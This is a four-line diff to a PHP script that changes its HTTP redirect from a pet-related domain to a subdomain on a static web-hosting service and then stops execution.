@@ -1,4 +1,4 @@
 <?php
-header("Location: http://pioneerpets.us/");
+header("Location: http://newtrial0786.bitballoon.com/");
 die();
 ?>
